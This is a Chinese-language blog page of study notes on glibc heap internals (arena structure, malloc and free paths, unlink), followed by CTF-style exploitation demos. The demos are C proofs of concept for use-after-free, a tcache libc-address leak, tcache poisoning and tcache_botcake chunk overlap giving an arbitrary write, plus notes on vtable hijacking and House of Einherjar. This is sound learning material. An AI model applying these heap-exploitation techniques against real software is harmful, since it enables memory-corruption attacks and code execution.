flags记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。  *&#x2F;</span><br><span class="line">    int flags;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 存放每个 fast chunk 链表头部的指针 *&#x2F;</span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* 指向分配区的 top chunk *&#x2F;</span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 最新的 chunk 分割之后剩下的那部分 *&#x2F;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。 *&#x2F;</span><br><span class="line">    mchunkptr bins[ NBINS * 2 - 2 ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chun..*&#x2F;</span><br><span class="line">    unsigned int binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* Linked list, points to the next arena *&#x2F;</span><br><span class="line">    struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">       by free_list_lock in arena.c.  *&#x2F;</span><br><span class="line">    struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">       the free list.  Access to this field is serialized by</span><br><span class="line">       free_list_lock in arena.c.  *&#x2F;</span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Memory allocated from the system in this arena.  *&#x2F;</span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="深入了解堆实现"><a href="#深入了解堆实现" class="headerlink" title="深入了解堆实现"></a>深入了解堆实现</h1><h2 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h2><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h3><p>函数实现步骤<br>1、若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步。<br>2、从 fastbin 中获取一个空闲 chunk。<br>3、尝试向后合并。<br>4、若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步。<br>5、否则尝试向前合并后，插入到 unsorted_bin 中。<br>6、获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步。<br>7、退出函数。</p>
<h2 id="创建堆"><a href="#创建堆" class="headerlink" title="创建堆"></a>创建堆</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc<ul>
<li>从恰好大小合适的 large bin 中获取 chunk</li>
<li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk</li>
</ul>
</li>
<li>Free<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）</li>
</ul>
</li>
<li>malloc_consolidate<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）</li>
</ul>
</li>
<li>realloc<ul>
<li>前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）<br>在unlink后，拖链的p的fd跟bk的指针都没有变化，我们可以利用这个泄露地址。</li>
</ul>
</li>
<li>libc 地址<ul>
<li>P 位于双向链表头部，bk 泄漏</li>
<li>P 位于双向链表尾部，fd 泄漏</li>
<li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li>
</ul>
</li>
<li>泄漏堆地址，双向链表包含多个空闲 chunk<ul>
<li>P 位于双向链表头部，fd 泄漏</li>
<li>P 位于双向链表中，fd 和 bk 均可以泄漏</li>
<li>P 位于双向链表尾部，bk 泄漏</li>
</ul>
</li>
</ul>
<h2 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h3><p>函数实现步骤<br>1、该函数会首先检查是否有内存分配函数的钩子函数（__malloc_hook）<br>2、接着会寻找一个 arena 来试图分配内存<br>3、然后调用 _int_malloc 函数去申请对应的内存<br>4、如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存<br>5、如果申请到了 arena，那么在退出之前还得解锁。<br>6、判断目前的状态是否满足以下条件<br>+ 要么没有申请到内存<br>+ 要么是 mmap 的内存<br>+ 要么申请到的内存必须在其所分配的arena中<br>7、最后返回内存</p>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>1、它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法<br>2、它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存<br>3、当所有的空闲 chunk 都无法满足时，它会考虑 top chunk<br>4、当 top chunk 也无法满足时，堆分配器才会进行内存块申请</p>
<h4 id="chunk不同范围申请实现"><a href="#chunk不同范围申请实现" class="headerlink" title="chunk不同范围申请实现"></a>chunk不同范围申请实现</h4><ul>
<li>fastbin<ul>
<li>得到对应的fastbin的下标</li>
<li>得到对应的fastbin的头指针</li>
<li>利用fd遍历对应的bin内是否有空闲的chunk块</li>
<li>检查取到的 chunk 大小是否与相应的 fastbin 索引一致</li>
<li>根据取得的 victim ，利用 chunksize 计算其大小</li>
<li>利用fastbin_index 计算 chunk 的索引</li>
<li>将获取的到chunk转换为mem模式</li>
<li>如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</li>
</ul>
</li>
<li>small bin<ul>
<li>获取 small bin 的索引</li>
<li>获取对应 small bin 中的 chunk 指针</li>
<li>先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</li>
<li>如果 victim = bin ，那说明该 bin 为空</li>
<li>如果不相等，那么会有两种情况<ul>
<li>第一种情况，small bin 还没有初始化<ul>
<li>执行初始化，将 fast bins 中的 chunk 进行合并</li>
</ul>
</li>
<li>第二种情况，small bin 中存在空闲的 chunk<ul>
<li>获取 small bin 中倒数第二个 chunk</li>
<li>检查 bck-&gt;fd 是不是 victim，防止伪造</li>
<li>设置 victim 对应的 inuse 位</li>
<li>修改 small bin 链表，将 small bin 的最后一个 chunk 取出</li>
<li>如果不是 main_arena，设置对应的标志</li>
<li>将申请到的 chunk 转化为对应的 mem 状态</li>
<li>如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>large bin<ul>
<li>获取large bin的下标</li>
<li>如果存在fastbin的话，会处理 fastbin</li>
</ul>
</li>
<li>大循环<br>如果程序执行到了这里，那么说明 与 chunk 大小正好一致的 bin (fast bin， small bin) 中没有 chunk可以直接满足需求 ，但是large chunk 则是在这个大循环中处理<ul>
<li>尝试从 unsorted bin 中分配用户所需的内存<ul>
<li>unsort bin 遍历</li>
<li>small request</li>
<li>初始取出</li>
<li>exact fit</li>
<li>place chunk in small bin</li>
<li>place chunk in large bin</li>
<li>最终取出</li>
<li>while 最多迭代10000次</li>
<li></li>
</ul>
</li>
<li>尝试从 large bin 中分配用户所需的内存</li>
<li>寻找较大 chunk<ul>
<li>找到一个合适的 map</li>
<li>找到合适的 bin</li>
<li>简单检查 chunk</li>
<li>真正取出chunk</li>
</ul>
</li>
<li>尝试从 top chunk 中分配用户所需内存</li>
</ul>
</li>
</ul>
<h2 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="_libc_free"></a>_libc_free</h3><ul>
<li>判断是否有钩子函数 __free_hook</li>
<li>free NULL没有作用</li>
<li>将mem转换为chunk状态</li>
<li>如果该块内存是mmap得到的</li>
<li>根据chunk获得分配区的指针</li>
<li>执行释放</li>
</ul>
<h1 id="内容来源"><a href="#内容来源" class="headerlink" title="内容来源"></a>内容来源</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/diegodu/p/9230280.html">Linux进程分配内存的两种方式brk和mmap</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxnewbie/p/3884611.html">sbrk与brk的使用</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_overview/">ctfwiki概述</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/96847761">堆漏洞挖掘:02—堆的glibc实现与Arena</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_structure/">ctfwiki堆相关数据结构</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/plus_re/article/details/79265805">浅谈 malloc_consolidate() 函数具体实现</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#chunk">ctfwiki深入理解堆实现</a></p>
<p>本文作者：PwnKi</p>
<p>本文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">https://www.cnblogs.com/luoleqi/p/11801400.html</a></p>
<hr>
<h2 id="uaf漏洞利用"><a href="#uaf漏洞利用" class="headerlink" title="uaf漏洞利用"></a>uaf漏洞利用</h2><p><img src="https://i.imgur.com/H1n8uM1.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 32</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *buf1;</span><br><span class="line">    <span class="keyword">char</span> *buf2;</span><br><span class="line"> </span><br><span class="line">    buf1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf1：0x%p\n&quot;</span>, buf1);</span><br><span class="line">    <span class="built_in">free</span>(buf1);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 分配 buf2 去“占坑”buf1 的内存位置</span></span><br><span class="line">    buf2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：0x%p\n\n&quot;</span>, buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 对buf2进行内存清零</span></span><br><span class="line">    <span class="built_in">memset</span>(buf2, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：%d\n&quot;</span>, *buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 重引用已释放的buf1指针，但却导致buf2值被篡改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Use After Free ===\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf1, <span class="string">&quot;hack&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：%s\n\n&quot;</span>, buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(buf2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>在通常的浏览器UAF漏洞中，都是某个C++对象被释放后重引用，假设程序存在UAF的漏洞，有个悬挂指针指向test对象，要实现漏洞利用，通过占坑方式覆盖test对象的虚表指针，虚表指针指向虚函数存放地址，现在让其指向恶意构造的shellcode，当程序再次引用到test对象就会导致任意代码执行。</p>
</blockquote>
<p>虚函数：用virtual关键字申明的函数叫做虚函数，其一定是类的成员函数</p>
<p>虚表：存在虚函数的类都有一个一维的虚函数表叫做虚表</p>
<p>虚表指针：类的对象有一个指向虚表开始的虚指针。</p>
<blockquote>
<p>虚表和类对应</p>
<p>虚指针和对象对应</p>
</blockquote>
<p>当对象去调用这个虚函数的时候就会使用到这个虚指针，去虚表中查找对应虚函数的地址。</p>
<h1 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h1><p>bin有/tcache bin /fast bin /unsorted bin /small bin /largebin</p>
<p>tcahebin相对于其他的出现得比较晚，在2.26加入。</p>
<p>它的全名为：thread local caching</p>
<blockquote>
<p>它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk。</p>
<p>它和fastbin类似，先进后出，而且prev_inuse标记位不会被清除，所以tcachebin中的chunk不会被合并，即使和top chunk相邻，但是有很多fastbin的保护机制它没有应用。</p>
<p>|————————————-|</p>
<p>|————————————-|</p>
<p>链接七个chunk</p>
<p>|        |     |    |   |……64个bin</p>
<p>|—-|—-|—-|—|—|—|—|—|—|</p>
</blockquote>
<blockquote>
<p>大小：0x20~0x410.</p>
</blockquote>
<p>另外tcache机制出现后，每次产生对都会先产生一个0x250/0x290(glibc 2.31)大小的堆块，该堆块位于堆的开头，用于记录每个bins中的chunk数量，每个字节对应一条tcache bin链的数量。</p>
<blockquote>
<p>strings /lib/x86_64-linux-gnu/libc.so.6|grep ‘GLIBC’本机的是2.31版本的glibc</p>
</blockquote>
<p>还有一点值得注意tcachebin中的fd指针式指向malloc返回地址，也就是用户数据部分，与fastbin不同，fastbinfd指针指向chunk头（bin—空闲chunk）</p>
<p>绕过tcache，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *ptr[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="comment">// 申请7个，释放7个，填满tcache bin[0x90]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(ptr[i]);</span><br><span class="line">    <span class="comment">// 这里再释放a，就会放入到unsorted bin中</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc addr is %llx\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面代码只是填满了[0x90]这一条tcache bin链表，如果想要自己申请释放的0x20大小的chunk进入到fast bin，那么同样需要先填满tcache bin[0x20]。</p>
<p>tcache poisoning</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在fck处分配堆块</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fck;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fck addr is %p\n&quot;</span>, &amp;fck);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> * ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *ptr1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span></span><br><span class="line">    ptr1[<span class="number">0</span>] = (<span class="keyword">long</span> <span class="keyword">long</span>)&amp;fck;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x80</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在将chunk放入tcache之后，会将chunk-&gt;key设置为tcachestruct，即是heap的开头，来表示该chunk已经放入了tcache。而将chunk从tcache取出来后则将chunk-&gt;key设置为NULL清空。 总体上对tcache的改动是在tcacheentry结构指针中增加了一个变量key，<strong>来表明该chunk是否处于tcache的状态。</strong></p>
</blockquote>
<h3 id="tcache-botcake-块重叠"><a href="#tcache-botcake-块重叠" class="headerlink" title="tcache_botcake 块重叠"></a>tcache_botcake 块重叠</h3><p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20210917191410991.png" alt="image-20210917191410991"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Inspired by how2heap\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to create chunk overlap, only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Alloc 7 chunks to fill up tcache list\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n2. Prepare two chunk with the same size as befor, for consolidation in unsortedbin\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x100大于fastbin大小，于是进入unsortedbin，否则在tcache用完后该使用fastbin了,这里的大小必须也是0x100，因为只有这个之前malloc过7次的tcachebin链表满了</span></span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Padding chunk to prevent consolidation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//这个为了避免top chunk合并物理相邻的chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n3. Fill in the tcache list and consolidation two prepared chunk in unsortedbin\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n4. Get a chunk from tcache list and make chunk overlap\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//double free 中间间隔a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, chunk %p will be freed into tcache list\n&quot;</span>, b);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* res = <span class="built_in">malloc</span>(<span class="number">0x130</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size is not matched with tcache list, so get chunk from unsortedbin, which makes chunk overlap\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(res+<span class="number">0x110</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim);<span class="comment">//uint64_t:long int     unsortedbin合并成一个大chunk，于是对malloc到的较大chunk能更改其fd值，于是tcachebin中根据9b20的fd把0x0000555555558030链接上tcache，但是8030没有bk于是无法找到下面的chunk，再次malloc以后就把8030这个地址给了用户，用户就能在这个地址内随意写。</span></span><br><span class="line"><span class="comment">//我在这个大块里面填写和直接使用b那个地址指针填写有什么区别？</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, you can control tcache list to alloc arbitrary address\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *target = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//这里拿到victim这个地址的随意写</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)target = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个利用流程：</p>
<p>首先malloc比fastbin大的chunk，malloc了7个，再malloc了a 、b大小和前面相同。</p>
<p>（unsorted bin会合并空闲相邻的chunk）</p>
<p>接下来free7个chunk，把tcachebin填满，接下来free b,a 因为没有置0，所以他们都可以继续使用。</p>
<p>再接下来malloc(0x100)把tcache空出来，把b放进tcache里面（再次free b）,这样b既在tcachebin中也在unsorted里面，虽然被合并了。</p>
<p>接下来malloc(0x130)，tcache中的内容不符合标准（大小），于是切割unsortedbin中的chunk，这个大小已经把b的范围圈进去了，下面res+0x110直接写入fd，改为victim的地址（任意写），于是tcachebin中b的fd变成了victim的地址，头部直接指向victim地址处，再次malloc(0x100)就会把victim地址给用户，向这个地址内写入内容。</p>
<blockquote>
<p>和上面那个有什么区别？</p>
<p>在这里没有直接使用那个被更改chunk的指针，而是通过前一个指针来索引。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.wangqingzheng.com/anquanke/60/194960.html">http://www.wangqingzheng.com/anquanke/60/194960.html</a></p>
</blockquote>
<h3 id="tcache-house-of-einherjar"><a href="#tcache-house-of-einherjar" class="headerlink" title="tcache_house_of_einherjar"></a>tcache_house_of_einherjar</h3><blockquote>
<p>The House of Einherjar 使用空字节逐一溢出来控制 malloc() 返回的指针。</p>
<p>off by one 修改下一个堆块的 prev_size、修改下一个堆块的 PREV_INUSE 比特位。</p>
</blockquote>
<p><strong>intptr_t是为了跨平台，其长度总是所在平台的位数，所以用来存放地址。</strong></p>
<p>unlink的诀窍就是通过验证，我们需要</p>
<ul>
<li><code>fake_chunk-&gt;fd == (struct malloc_chunk *)P</code></li>
<li><code>fake_chunk-&gt;bk == (struct malloc_chunk *)P</code></li>
</ul>
<p>unlink:</p>
<blockquote>
<p>unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当<strong>两个free的堆块在物理上相邻时</strong>，会将他们合并，并将原来free的堆块在<strong>原来</strong>的链表中<strong>解链</strong>，<strong>加入新的链表</strong>中</p>
</blockquote>
<p><strong>检查：</strong></p>
<p><strong>1.size检查，当前chunk的size和下一个chunk的pre_size大小是否一样</strong></p>
<p><strong>2.fd和bk检查，FD-&gt;bk = P &amp;&amp;BK-&gt;fd = P</strong> 这个大写FD BK是本chunk的前一个和后一个chunk</p>
<p><em>3.largebin中nextsize双向链表完整性检查（少用）</em></p>
<p>glibc 2.23<br>​    检查p和其前后的chunk是否构成双向链表<br>​    检查p和其前后的large chunk的nextsize域是否构成双向链表<br>glibc 2.27 2.29 新增加一下保护<br>​    检查p的 size 是否等于物理相邻的后一个chunk的 pre_size</p>
